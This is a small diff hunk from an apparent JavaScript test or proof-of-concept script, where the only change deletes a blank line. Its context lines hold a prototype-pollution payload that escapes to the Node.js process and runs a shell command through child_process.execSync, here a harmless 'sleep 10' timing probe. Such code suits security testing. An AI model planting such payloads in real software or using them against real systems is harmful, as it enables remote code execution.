@@ -8,7 +8,6 @@ catch(e){
     console.log("[!] symbolic execution not enabled")
 }
 
-
 let cmd = "this.constructor.constructor('return process')().mainModule.require('child_process').execSync('sleep 10')"
 Object.prototype.ANY_CODE= [cmd];
 
